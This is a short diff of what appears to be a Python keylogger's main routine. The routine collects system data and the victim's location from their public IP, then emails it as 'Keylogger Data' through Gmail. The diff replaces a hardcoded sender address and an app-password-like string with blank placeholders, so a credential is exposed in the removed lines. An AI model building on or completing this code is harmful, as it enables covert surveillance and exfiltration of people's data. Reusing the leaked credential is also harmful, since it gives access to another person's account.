@@ -193,11 +193,11 @@ if __name__ == "__main__":
     system_data = system_info()
     location_info = get_location_from_public_ip()
 
-    sender_email = "redpanda121003@gmail.com"
-    sender_password = "pneewfuoyynmqctj"
+    sender_email = "" # enter sender email here
+    sender_password = "" # enter gmail code here
 
     email_sender = EmailSender(sender_email, sender_password)
-    recipient_email = "redpanda121003@gmail.com"
+    recipient_email = "" # Enter recipient here
 
     email_subject = "Keylogger Data"
     # display the data in a presentable way
